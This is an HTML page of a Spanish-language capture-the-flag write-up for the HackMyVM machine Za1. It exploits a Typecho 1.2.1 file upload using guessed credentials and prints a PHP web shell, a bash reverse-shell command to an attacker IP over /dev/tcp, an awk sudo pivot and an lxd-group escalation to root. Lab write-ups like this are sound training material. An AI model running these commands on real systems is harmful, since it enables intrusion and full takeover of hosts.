@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8">
+<meta http-equiv="content-type" content="text/html">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title itemprop="name">HackMyVM - Za1 | noname</title>
+<meta property="og:title" content="HackMyVM - Za1 | noname" />
+<meta name="twitter:title" content="HackMyVM - Za1 | noname" />
+<meta itemprop="name" content="HackMyVM - Za1 | noname" />
+<meta name="application-name" content="HackMyVM - Za1 | noname" />
+<meta property="og:site_name" content="" />
+
+<meta name="description" content="Writeup Za1 🟢">
+<meta itemprop="description" content="Writeup Za1 🟢" />
+<meta property="og:description" content="Writeup Za1 🟢" />
+<meta name="twitter:description" content="Writeup Za1 🟢" />
+
+<meta property="og:locale" content="es" />
+<meta name="language" content="es" />
+
+  <link rel="alternate" hreflang="en" href="https://0x-noname.github.io/writeups/hmv/za1/" title="" />
+
+
+
+  <meta itemprop="image" content="https://0x-noname.github.io/machines/hmv/za1/za1_logo.webp" />
+  <meta property="og:image" content="https://0x-noname.github.io/machines/hmv/za1/za1_logo.webp" />
+  <meta name="twitter:image" content="https://0x-noname.github.io/machines/hmv/za1/za1_logo.webp" />
+  <meta name="twitter:image:src" content="https://0x-noname.github.io/machines/hmv/za1/za1_logo.webp" />
+
+
+
+
+    
+    
+    
+
+    <meta property="og:type" content="article" />
+    <meta property="og:article:published_time" content=2023-08-31T15:30:15&#43;0200 />
+    <meta property="article:published_time" content=2023-08-31T15:30:15&#43;0200 />
+
+    
+
+    
+
+    <script defer type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "Article",
+        "headline": "HackMyVM - Za1",
+        "author": {
+        "@type": "Person",
+        "name": ""
+        },
+        "datePublished": "2023-08-31",
+        "description": "Writeup Za1 🟢",
+        "wordCount":  981 ,
+        "mainEntityOfPage": "True",
+        "dateModified": "2023-08-31",
+        "image": {
+        "@type": "imageObject",
+        "url": "\/machines\/hmv\/za1\/za1_logo.webp"
+        },
+        "publisher": {
+        "@type": "Organization",
+        "name": "noname"
+        }
+    }
+    </script>
+
+
+
+<meta name="generator" content="Hugo 0.125.7">
+
+    
+
+    <link rel="canonical" href="https://0x-noname.github.io/writeups/hmv/za1/">
+    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
+    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
+
+    
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
+    <link rel="shortcut icon" href="/favicon.ico">
+
+
+
+
+<link rel="manifest" href="https://0x-noname.github.io/site.webmanifest">
+
+<meta name="msapplication-config" content="/browserconfig.xml">
+<meta name="msapplication-TileColor" content="#2d89ef">
+<meta name="theme-color" content="#434648">
+
+    
+    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">
+
+    
+    
+  
+
+</head>
+<body data-theme = "" class="notransition">
+
+<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>
+
+<div class="navbar" role="navigation">
+    <nav class="menu" aria-label="Main Navigation">
+        <a href="https://0x-noname.github.io/" class="logo">
+            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
+viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
+stroke-linejoin="round" class="feather feather-home">
+<title></title>
+<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
+<polyline points="9 22 9 12 15 12 15 22"></polyline>
+</svg>
+        </a>
+        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
+        <label for="menu-trigger">
+            <span class="menu-icon">
+                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
+            </span>
+        </label>
+
+        <div class="trigger">
+            <ul class="trigger-container">
+                
+                
+                <li>
+                    <a class="menu-link " href="/">
+                        $ home
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackmyvm/">
+                        $ hmv
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/hackthebox/">
+                        $ htb
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/posts/vulnyx/">
+                        $ nyx
+                    </a>
+                    
+                </li>
+                
+                <li>
+                    <a class="menu-link " href="/whoami/">
+                        $ whoami
+                    </a>
+                    
+                </li>
+                
+                <li class="menu-separator">
+                    <span>|</span>
+                </li>
+                
+                
+            </ul>
+            <a id="mode" href="#">
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
+<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
+            </a>
+        </div>
+    </nav>
+</div>
+
+<div class="wrapper post">
+    <main class="page-content" aria-label="Content">
+        <article>
+            <header class="header">
+                <h1 class="header-title">HackMyVM - Za1</h1>
+                
+                
+                <div class="post-meta">
+                    <time datetime="2023-08-31T15:30:15&#43;02:00" itemprop="datePublished"> Aug 31, 2023 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><img src="/../machines/hmv/za1/za1_logo.webp" alt="logo"></p>
+<ul>
+<li><em>File Upload Typecho v.1.2.1</em></li>
+<li><em>Abuse Awk Binary</em></li>
+<li><em>lxd/lxc Group - Privilege escalation</em></li>
+</ul>
+<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -p- -T5 -n -v 192.168.1.15
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
+</span></span><span class="line"><span class="cl">22/tcp open  ssh
+</span></span><span class="line"><span class="cl">80/tcp open  http
+</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nmap -sVC -v -p 22,80 192.168.1.15
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   2048 36325b78d0f43c9f051aa713913e38c1 (RSA)
+</span></span><span class="line"><span class="cl">|   256 7207821526ce1334e842cfdadee2a714 (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 fc9c664686601a2932c61fecb247b874 (ED25519)
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+</span></span><span class="line"><span class="cl">|_http-title: Zacarx&#39;s blog
+</span></span><span class="line"><span class="cl">| http-methods: 
+</span></span><span class="line"><span class="cl">|_  Supported Methods: GET HEAD POST OPTIONS
+</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.29 (Ubuntu)
+</span></span><span class="line"><span class="cl">|_http-generator: Typecho 1.2.1
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></div><h3 id="http---tcp-80">HTTP - TCP 80</h3>
+<p>En el puerto 80 observo una web sencilla, al poner el ratón encima de <code>Zacarx's blog</code> puedo ver el dominio <code>za1.hmv</code>.</p>
+<p><img src="/../machines/hmv/za1/http.webp" alt="http"></p>
+<p>Agrego el dominio a mi archivo hosts y veo que la web cambia estéticamente.</p>
+<p><img src="/../machines/hmv/za1/domain.webp" alt="domain"></p>
+<p>Realizo fuerza bruta de directorios.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ gobuster dir -u http://za1.hmv -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">Gobuster v3.5
+</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">[+] Url:                     http://za1.hmv
+</span></span><span class="line"><span class="cl">[+] Method:                  GET
+</span></span><span class="line"><span class="cl">[+] Threads:                 10
+</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
+</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.5
+</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">2023/08/31 13:26:05 Starting gobuster in directory enumeration mode
+</span></span><span class="line"><span class="cl">===============================================================
+</span></span><span class="line"><span class="cl">/admin                (Status: 301) [Size: 302] [--&gt; http://za1.hmv/admin/]
+</span></span><span class="line"><span class="cl">/install              (Status: 301) [Size: 304] [--&gt; http://za1.hmv/install/]
+</span></span><span class="line"><span class="cl">/sql                  (Status: 301) [Size: 300] [--&gt; http://za1.hmv/sql/]
+</span></span><span class="line"><span class="cl">/var                  (Status: 301) [Size: 300] [--&gt; http://za1.hmv/var/]
+</span></span><span class="line"><span class="cl">/usr                  (Status: 301) [Size: 300] [--&gt; http://za1.hmv/usr/]
+</span></span><span class="line"><span class="cl">/server-status        (Status: 403) [Size: 272]
+</span></span></code></pre></div><p>En admin hay una panel de login.</p>
+<p><img src="/../machines/hmv/za1/login.webp" alt="login"></p>
+<p>Pruebo con el usuario <strong>zacarx</strong> y la contraseña <strong>zacarx</strong>.</p>
+<p><img src="/../machines/hmv/za1/login_zacarx.webp" alt="login_zacarx"></p>
+<p>Accedo al panel de <strong>zacarx</strong>.</p>
+<p><img src="/../machines/hmv/za1/zacar_dashboard.webp" alt="zacar_dashboard"></p>
+<blockquote>
+<p>En este <a href="https://github.com/lal0ne/vulnerability/commit/ac443c6556988f7f412ab28b19e4248ad2d8929f">enlace</a> explica como añadir archivos php y subir archivos.</p>
+</blockquote>
+<p>Con una extensión para el navegador traduzco el sitio web.</p>
+<p><img src="/../machines/hmv/za1/dashboard_traducido.webp" alt="dashboard_traducido"></p>
+<p>Me voy a <strong>set up</strong> y hago click en <strong>basic</strong>.</p>
+<p><img src="/../machines/hmv/za1/setup_basic.webp" alt="setup_basic"></p>
+<p>En <code>other formats</code> añado la extensión php y guardo los cambios.</p>
+<p><img src="/../machines/hmv/za1/conf_php.webp" alt="conf_php"></p>
+<p>Navego hacia write y hago click en <code>write an article</code>.</p>
+<p><img src="/../machines/hmv/za1/write.webp" alt="write"></p>
+<p>En esta ventana le doy click a <strong>appendix</strong> y me sale la opción de subir archivos.</p>
+<p><img src="/../machines/hmv/za1/appendix.webp" alt="appendix"></p>
+<blockquote>
+<p>Para subir el archivo hay que hacerlo con la web en chino, sino el botón <code>choose file upload</code> no funcionará.</p>
+</blockquote>
+<p>Subo el archivo <code>cmd.php</code> que contiene este código.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>  
+</span></span><span class="line"><span class="cl">        <span class="nx">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>El archivo se ha subido correctamente y me proporciona un link con la ruta del archivo que acabo de subir, click en el primer botón para continuar.</p>
+<p><img src="/../machines/hmv/za1/upload_cmd.webp" alt="upload_cmd"></p>
+<p>En esta ventana se puede ver los pasos que he realizado anteriormente.</p>
+<p><img src="/../machines/hmv/za1/upload_ok.webp" alt="upload_ok"></p>
+<p>Mando una petición con curl y veo que soy el usuario www-data.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl &#34;http://za1.hmv/usr/uploads/2023/08/884955627.php?c=id&#34;
+</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></div><p>Como puedo ejecutar comandos me mando una shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ curl &#34;http://za1.hmv/usr/uploads/2023/08/884955627.php?c=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.18%2F4444%200%3E%261%22&#34;
+</span></span></code></pre></div><p>Obtengo la shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">❯ nc -lvnp 4444
+</span></span><span class="line"><span class="cl">listening on [any] 4444 ...
+</span></span><span class="line"><span class="cl">connect to [192.168.1.18] from (UNKNOWN) [192.168.1.15] 39672
+</span></span><span class="line"><span class="cl">bash: cannot set terminal process group (1273): Inappropriate ioctl for device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">www-data@za_1:/var/www/html/usr/uploads/2023/08$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl">uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span></span></code></pre></div><p>Tratamiento de la tty.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">ctrl + Z
+</span></span><span class="line"><span class="cl">stty raw -echo<span class="p">;</span><span class="nb">fg</span>
+</span></span><span class="line"><span class="cl">reset
+</span></span><span class="line"><span class="cl">xterm
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm <span class="nv">SHELL</span><span class="o">=</span>bash
+</span></span><span class="line"><span class="cl">stty rows <span class="m">50</span> columns <span class="m">200</span>
+</span></span></code></pre></div><p>Enumero permisos de sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">www-data@za_1:/var/www/html/usr/uploads/2023/08$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries for www-data on za_1:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User www-data may run the following commands on za_1:
+</span></span><span class="line"><span class="cl">    (za_1) NOPASSWD: /usr/bin/awk
+</span></span></code></pre></div><p>Uso el recurso <a href="https://gtfobins.github.io/gtfobins/awk/#sudo">GTFObins</a> para pivotar de <strong>www-data</strong> a <strong>za_1</strong>.</p>
+<pre tabindex="0"><code>www-data@za_1:/var/www/html/usr/uploads/2023/08$ sudo -u za_1 awk &#39;BEGIN {system(&#34;/bin/bash&#34;)}&#39;
+za_1@za_1:/var/www/html/usr/uploads/2023/08$ id
+uid=1000(za_1) gid=1000(za_1) groups=1000(za_1),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+</code></pre><p>En el comando anterior se puede observar <strong>za_1</strong> tiene en grupos a <strong>lxd</strong>, buscando en internet he encontrado este post de <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">hacktricks</a> .</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sudo su
+</span></span><span class="line"><span class="cl">sudo apt update
+</span></span><span class="line"><span class="cl">sudo apt install -y git golang-go debootstrap rsync gpg squashfs-tools
+</span></span><span class="line"><span class="cl">git clone https://github.com/lxc/distrobuilder
+</span></span><span class="line"><span class="cl">cd distrobuilder
+</span></span><span class="line"><span class="cl">make
+</span></span><span class="line"><span class="cl">mkdir -p $HOME/ContainerImages/alpine/
+</span></span><span class="line"><span class="cl">cd $HOME/ContainerImages/alpine/
+</span></span><span class="line"><span class="cl">wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
+</span></span><span class="line"><span class="cl">sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.18
+</span></span></code></pre></div><p>Una vez se han creado los archivos <strong>lxd.tar.xz</strong> and <strong>rootfs.squashfs</strong> los subo a la máquina víctima.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">za_1@za_1:/tmp$ wget 192.168.1.18/lxd.tar.xz 
+</span></span><span class="line"><span class="cl">za_1@za_1:/tmp$ wget 192.168.1.18/rootfs.squashfs
+</span></span></code></pre></div><p>Importo los archivos.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">za_1@za_1:/tmp$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
+</span></span><span class="line"><span class="cl">Image imported with fingerprint: 9e52970f6e179b3769c04ac6c9f4d9953818f72c9443379849d42b28a28dde80
+</span></span></code></pre></div><p>Compruebo se ha importado correctamente.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">za_1@za_1:/tmp$ lxc image list
+</span></span><span class="line"><span class="cl">+--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+
+</span></span><span class="line"><span class="cl">| ALIAS  | FINGERPRINT  | PUBLIC |               DESCRIPTION               |  ARCH  |  SIZE  |          UPLOAD DATE          |
+</span></span><span class="line"><span class="cl">+--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+
+</span></span><span class="line"><span class="cl">| alpine | 9e52970f6e17 | no     | Alpinelinux 3.18 x86_64 (20230831_1153) | x86_64 | 2.94MB | Aug 31, 2023 at 12:04pm (UTC) |
+</span></span><span class="line"><span class="cl">+--------+--------------+--------+-----------------------------------------+--------+--------+-------------------------------+
+</span></span></code></pre></div><p>Antes de crear el contenedor hay que iniciar lxd.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">za_1@za_1:/tmp$ lxd init
+</span></span><span class="line"><span class="cl">Would you like to use LXD clustering? (yes/no) [default=no]: 
+</span></span><span class="line"><span class="cl">Do you want to configure a new storage pool? (yes/no) [default=yes]: 
+</span></span><span class="line"><span class="cl">Name of the new storage pool [default=default]: 
+</span></span><span class="line"><span class="cl">Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: 
+</span></span><span class="line"><span class="cl">Create a new BTRFS pool? (yes/no) [default=yes]: 
+</span></span><span class="line"><span class="cl">Would you like to use an existing block device? (yes/no) [default=no]: 
+</span></span><span class="line"><span class="cl">Size in GB of the new loop device (1GB minimum) [default=15GB]: 
+</span></span><span class="line"><span class="cl">Would you like to connect to a MAAS server? (yes/no) [default=no]: 
+</span></span><span class="line"><span class="cl">Would you like to create a new local network bridge? (yes/no) [default=yes]: 
+</span></span><span class="line"><span class="cl">What should the new bridge be called? [default=lxdbr0]: 
+</span></span><span class="line"><span class="cl">What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+</span></span><span class="line"><span class="cl">What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
+</span></span><span class="line"><span class="cl">Would you like LXD to be available over the network? (yes/no) [default=no]: 
+</span></span><span class="line"><span class="cl">Would you like stale cached images to be updated automatically? (yes/no) [default=yes] 
+</span></span><span class="line"><span class="cl">Would you like a YAML &#34;lxd init&#34; preseed to be printed? (yes/no) [default=no]: 
+</span></span></code></pre></div><p>Creo el contenedor privesc.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">za_1@za_1:/tmp$ lxc init alpine privesc -c security.privileged=true
+</span></span><span class="line"><span class="cl">Creating privesc
+</span></span></code></pre></div><p>Con <code>lxc list</code> puedo ver el contenedor creado.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">za_1@za_1:/tmp$ lxc list
+</span></span><span class="line"><span class="cl">+---------+---------+------+------+------------+-----------+
+</span></span><span class="line"><span class="cl">|  NAME   |  STATE  | IPV4 | IPV6 |    TYPE    | SNAPSHOTS |
+</span></span><span class="line"><span class="cl">+---------+---------+------+------+------------+-----------+
+</span></span><span class="line"><span class="cl">| privesc | STOPPED |      |      | PERSISTENT | 0         |
+</span></span><span class="line"><span class="cl">+---------+---------+------+------+------------+-----------+
+</span></span></code></pre></div><p>Añado el path de root a privesc.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">za_1@za_1:/tmp$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+</span></span><span class="line"><span class="cl">Device host-root added to privesc
+</span></span></code></pre></div><p>Lanzo el contenedor y obtengo el root.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">za_1@za_1:/tmp$ lxc start privesc
+</span></span><span class="line"><span class="cl">za_1@za_1:/tmp$ lxc exec privesc /bin/sh
+</span></span><span class="line"><span class="cl">~ # id
+</span></span><span class="line"><span class="cl">uid=0(root) gid=0(root)
+</span></span></code></pre></div><blockquote>
+<p>Para leer la flag de root solo hay que ir a la ruta que añadimos anteriormente al contenedor privesc  <code>/mnt/root</code>.</p>
+</blockquote>
+<p>Y aquí termina la máquina Za_1.</p>
+<p>Saludos!</p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="https://github.com/0x-noname" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2024 .
+        
+    </small>
+</footer><a href="#" title="" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script src="https://0x-noname.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>
+
+    
+
+</body>
+</html>
